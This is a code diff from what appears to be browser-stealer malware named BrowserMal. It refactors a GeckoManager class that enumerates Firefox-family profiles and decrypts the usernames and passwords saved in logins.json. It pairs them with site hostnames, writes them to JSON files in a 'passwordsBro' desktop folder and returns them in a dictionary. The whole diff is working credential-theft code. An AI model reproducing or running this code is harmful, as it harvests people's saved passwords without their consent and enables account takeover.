@@ -3,27 +3,19 @@ using BrowserMal.Model;
 using Newtonsoft.Json;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using GeckoMal;
+using BrowserMal.Encryption;
+using BrowserMal.Util;
+using System;
 
 namespace BrowserMal.Manager
 {
-    public class GeckoManager<T>
+    public class GeckoManager<T> : Manager<T>
     {
-        private readonly string tableName;
-        private readonly SqliteTableModel sqliteTableModel;
-        private readonly Dictionary<string, string> resultList;
-
-        public GeckoManager(string tableName, SqliteTableModel sqliteTableModel)
+        public GeckoManager(string tableName, SqliteTableModel sqliteTableModel) : base(tableName, sqliteTableModel)
         {
-            this.tableName = tableName;
-            this.sqliteTableModel = sqliteTableModel;
-            resultList = new Dictionary<string, string>();
         }
 
-        private List<string> GetAllProfiles(string root) => Directory.GetDirectories(root).ToList();
-
-        public void Init(ref List<BrowserModel> browsers)
+        public override Dictionary<string, string> Init(ref List<BrowserModel> browsers, string profileType = "")
         {
             foreach (BrowserModel browser in browsers)
             {
@@ -31,34 +23,21 @@ namespace BrowserMal.Manager
                     continue;
 
                 List<string> profiles = GetAllProfiles(browser.Location);
-                List<CredentialModel> creds = FetchFiles(profiles, browser.Name, browser.ProfileName);
+                List<T> creds = FetchFiles(profiles, browser.Name, browser.ProfileName);
 
                 if (creds.Count == 0)
                     continue;
 
-                Filesaver.FileManager.Save<CredentialModel>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_logins.json");
+                _resultList.Add($"{browser.Name}_{GetTableName.Replace(".json", "")}.json", JsonUtil.GetJson<T>(creds));
+                Filesaver.FileManager.Save<T>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{GetTableName.Replace(".json", "")}.json");
             }
 
+            return _resultList;
         }
-        //Encryption.GeckoDecryption geckoDecryption;
-        private List<CredentialModel> FetchFiles(List<string> profiles, string name, string specificProfile)
+
+        private List<T> FetchFiles(List<string> profiles, string name, string specificProfile)
         {
-            List<CredentialModel> result = new List<CredentialModel>();
-
-            /*foreach (string profile in profiles)
-            {
-                string loginFile = Path.Combine(profile, "logins.json");
-
-                if (File.Exists(loginFile))
-                {
-                    if (profile.Contains(specificProfile))
-                    {
-                        geckoDecryption = new Encryption.GeckoDecryption();
-                        geckoDecryption.Init(profile, name);
-                        break;
-                    }
-                }
-            }*/
+            List<T> result = new List<T>();
 
             foreach (string profile in profiles)
             {
@@ -66,13 +45,11 @@ namespace BrowserMal.Manager
 
                 if (File.Exists(loginFile))
                 {
-                    if (!loginFile.Contains(specificProfile))
+                    if (!loginFile.Contains(specificProfile) && !string.IsNullOrEmpty(specificProfile))
                         continue;
 
-                    GeckoMal.Encryption encryption = new GeckoMal.Encryption();
-                    encryption.Init(profile, name);
-                    /*geckoDecryption = new Encryption.GeckoDecryption();
-                    geckoDecryption.Init(profile, name);*/
+                    GeckoDecryption geckoDecryption = new GeckoDecryption();
+                    geckoDecryption.Init(profile, name);
 
                     GeckoLogin geckoLogin;
 
@@ -84,14 +61,13 @@ namespace BrowserMal.Manager
 
                     foreach (GeckoLoginData login in geckoLogin.logins) 
                     {
-                        string username = encryption.Decrypt(login.encryptedUsername);
-                        string password = encryption.Decrypt(login.encryptedPassword);
+                        string username = geckoDecryption.Decrypt(login.encryptedUsername);
+                        string password = geckoDecryption.Decrypt(login.encryptedPassword);
                         string hostname = login.hostname;
 
-                        result.Add(new CredentialModel(hostname, username, password));
+                        T obj = CreateInstanceOfType(new object[] { hostname, username, password });
+                        result.Add(obj);
                     }
-
-                    encryption.Unload();
 
                     break;
                 }
